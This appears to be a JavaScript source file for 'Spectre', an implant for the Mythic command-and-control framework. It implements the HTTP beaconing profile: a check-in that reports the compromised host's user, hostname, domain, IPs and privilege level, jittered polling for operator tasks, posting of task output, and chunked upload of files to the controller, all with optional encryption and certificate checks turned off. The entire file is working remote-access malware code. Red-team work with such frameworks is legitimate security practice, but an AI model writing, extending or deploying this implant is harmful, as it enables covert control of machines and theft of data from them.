// ============================================================
// Spectre - HTTP C2 Profile
// Implements Mythic HTTP C2 protocol: checkin, get_tasking,
// post_response with configurable URIs, headers, and intervals.
// ============================================================

const SpectreHTTP = {
    _config: null,
    _callbackUUID: null,
    _isCheckedIn: false,

    /**
     * Initialize the HTTP C2 client.
     */
    init: function(config) {
        this._config = {
            host: config.callback_host,
            port: config.callback_port,
            interval: config.callback_interval * 1000, // convert to ms
            jitter: config.callback_jitter,
            headers: config.headers || {},
            getURI: config.get_uri || '/api/v1/status',
            postURI: config.post_uri || '/api/v1/data',
            queryParam: config.query_param || 'token',
            payloadUUID: config.payloadUUID,
            encryptedExchange: config.encrypted_exchange_check,
        };
        this._callbackUUID = config.payloadUUID;
    },

    /**
     * Build the full URL for a given URI path.
     */
    _buildURL: function(uriPath) {
        const base = this._config.host.replace(/\/$/, '');
        const port = this._config.port;

        // Only append port if non-standard
        const isDefaultPort = (
            (base.startsWith('https') && port === 443) ||
            (base.startsWith('http:') && port === 80)
        );

        if (isDefaultPort) {
            return base + uriPath;
        }
        return base + ':' + port + uriPath;
    },

    /**
     * Calculate sleep time with jitter.
     */
    _getSleepTime: function() {
        const base = this._config.interval;
        const jitterPct = this._config.jitter / 100;
        const jitterRange = base * jitterPct;
        const jitter = (Math.random() * 2 - 1) * jitterRange;
        return Math.max(1000, Math.floor(base + jitter));
    },

    /**
     * Perform an HTTP request using Node.js http/https modules.
     * Returns a Promise resolving to the response body string.
     */
    _request: function(method, url, body) {
        return new Promise(function(resolve, reject) {
            const parsedUrl = new (require('url').URL)(url);
            const isHttps = parsedUrl.protocol === 'https:';
            const httpModule = require(isHttps ? 'https' : 'http');

            const options = {
                hostname: parsedUrl.hostname,
                port: parsedUrl.port || (isHttps ? 443 : 80),
                path: parsedUrl.pathname + parsedUrl.search,
                method: method,
                headers: Object.assign({}, SpectreHTTP._config.headers),
                rejectUnauthorized: false, // Accept self-signed certs
            };

            if (body) {
                options.headers['Content-Type'] = 'application/octet-stream';
                options.headers['Content-Length'] = Buffer.byteLength(body);
            }

            const req = httpModule.request(options, function(res) {
                const chunks = [];
                res.on('data', function(chunk) { chunks.push(chunk); });
                res.on('end', function() {
                    const responseBody = Buffer.concat(chunks).toString('utf-8');
                    resolve(responseBody);
                });
            });

            req.on('error', function(err) {
                reject(err);
            });

            req.setTimeout(30000, function() {
                req.destroy();
                reject(new Error('Request timeout'));
            });

            if (body) {
                req.write(body);
            }
            req.end();
        });
    },

    /**
     * Perform the Mythic encrypted key exchange (EKE).
     *
     * Stage 1: POST base64(payloadUUID + RSA_public_key)
     * Server responds with: base64(tempUUID + encrypted_session_key)
     */
    performKeyExchange: async function() {
        // Step 1: Generate RSA keypair, send public key
        const rsaPubKeyB64 = SpectreCrypto.prepareKeyExchange();

        const stage1Body = EncodingUtils.encodeMythicMessage(
            this._config.payloadUUID,
            rsaPubKeyB64
        );

        const url = this._buildURL(this._config.postURI);
        const stage1Response = await this._request('POST', url, stage1Body);

        // Decode response: base64(tempUUID + encrypted_data)
        const decoded = EncodingUtils.decodeMythicMessage(stage1Response);
        this._callbackUUID = decoded.uuid;

        // Step 2: Decrypt server response to get session key
        const result = SpectreCrypto.completeKeyExchange(
            decoded.data.toString('base64')
        );

        this._callbackUUID = result.newUUID || decoded.uuid;

        return true;
    },

    /**
     * Perform initial checkin with Mythic.
     * Sends system info, receives callback UUID.
     */
    checkin: async function(systemInfo) {
        const checkinData = {
            action: 'checkin',
            uuid: this._config.payloadUUID,
            ips: systemInfo.ips || [],
            os: systemInfo.os || 'Windows',
            user: systemInfo.user || '',
            host: systemInfo.hostname || '',
            pid: systemInfo.pid || 0,
            architecture: systemInfo.arch || 'x64',
            domain: systemInfo.domain || '',
            integrity_level: systemInfo.integrityLevel || 2,
            external_ip: '',
            process_name: systemInfo.processName || 'node.exe',
        };

        const jsonStr = JSON.stringify(checkinData);
        let body;

        if (this._config.encryptedExchange && SpectreCrypto._sessionKey) {
            // Encrypted: base64(UUID + AES(JSON))
            const encrypted = SpectreCrypto.encrypt(jsonStr);
            body = EncodingUtils.encodeMythicMessage(
                this._callbackUUID,
                encrypted
            );
        } else {
            // Plaintext: base64(UUID + JSON)
            body = EncodingUtils.encodeMythicMessage(
                this._callbackUUID,
                jsonStr
            );
        }

        const url = this._buildURL(this._config.postURI);
        const response = await this._request('POST', url, body);

        // Parse response
        const decoded = EncodingUtils.decodeMythicMessage(response);
        let responseData;

        if (SpectreCrypto._sessionKey) {
            responseData = JSON.parse(
                SpectreCrypto.decrypt(decoded.data.toString('base64'))
            );
        } else {
            responseData = JSON.parse(decoded.data.toString('utf-8'));
        }

        if (responseData.status === 'success') {
            this._callbackUUID = responseData.id;
            this._isCheckedIn = true;
            return responseData;
        }

        throw new Error('Checkin failed: ' + responseData.status);
    },

    /**
     * Request tasking from Mythic.
     */
    getTasking: async function() {
        const taskingRequest = {
            action: 'get_tasking',
            tasking_size: -1, // Get all available tasks
        };

        const jsonStr = JSON.stringify(taskingRequest);
        let body;

        if (SpectreCrypto._sessionKey) {
            const encrypted = SpectreCrypto.encrypt(jsonStr);
            body = EncodingUtils.encodeMythicMessage(
                this._callbackUUID,
                encrypted
            );
        } else {
            body = EncodingUtils.encodeMythicMessage(
                this._callbackUUID,
                jsonStr
            );
        }

        const url = this._buildURL(this._config.getURI);
        const response = await this._request('POST', url, body);

        const decoded = EncodingUtils.decodeMythicMessage(response);
        let responseData;

        if (SpectreCrypto._sessionKey) {
            responseData = JSON.parse(
                SpectreCrypto.decrypt(decoded.data.toString('base64'))
            );
        } else {
            responseData = JSON.parse(decoded.data.toString('utf-8'));
        }

        return responseData.tasks || [];
    },

    /**
     * Post task response back to Mythic.
     */
    postResponse: async function(responses) {
        const responseData = {
            action: 'post_response',
            responses: Array.isArray(responses) ? responses : [responses],
        };

        const jsonStr = JSON.stringify(responseData);
        let body;

        if (SpectreCrypto._sessionKey) {
            const encrypted = SpectreCrypto.encrypt(jsonStr);
            body = EncodingUtils.encodeMythicMessage(
                this._callbackUUID,
                encrypted
            );
        } else {
            body = EncodingUtils.encodeMythicMessage(
                this._callbackUUID,
                jsonStr
            );
        }

        const url = this._buildURL(this._config.postURI);
        const response = await this._request('POST', url, body);

        const decoded = EncodingUtils.decodeMythicMessage(response);
        let result;

        if (SpectreCrypto._sessionKey) {
            result = JSON.parse(
                SpectreCrypto.decrypt(decoded.data.toString('base64'))
            );
        } else {
            result = JSON.parse(decoded.data.toString('utf-8'));
        }

        return result;
    },

    /**
     * Upload a file chunk to Mythic.
     */
    postUpload: async function(fileData) {
        const uploadData = {
            action: 'upload',
            chunk_num: fileData.chunk_num,
            chunk_data: fileData.chunk_data,
            file_id: fileData.file_id || '',
            full_path: fileData.full_path || '',
            task_id: fileData.task_id,
        };

        const jsonStr = JSON.stringify(uploadData);
        let body;

        if (SpectreCrypto._sessionKey) {
            const encrypted = SpectreCrypto.encrypt(jsonStr);
            body = EncodingUtils.encodeMythicMessage(
                this._callbackUUID,
                encrypted
            );
        } else {
            body = EncodingUtils.encodeMythicMessage(
                this._callbackUUID,
                jsonStr
            );
        }

        const url = this._buildURL(this._config.postURI);
        const response = await this._request('POST', url, body);

        const decoded = EncodingUtils.decodeMythicMessage(response);
        if (SpectreCrypto._sessionKey) {
            return JSON.parse(
                SpectreCrypto.decrypt(decoded.data.toString('base64'))
            );
        }
        return JSON.parse(decoded.data.toString('utf-8'));
    },

    /**
     * Update callback interval/jitter.
     */
    updateInterval: function(interval, jitter) {
        if (interval !== undefined) {
            this._config.interval = interval * 1000;
        }
        if (jitter !== undefined) {
            this._config.jitter = jitter;
        }
    }
};
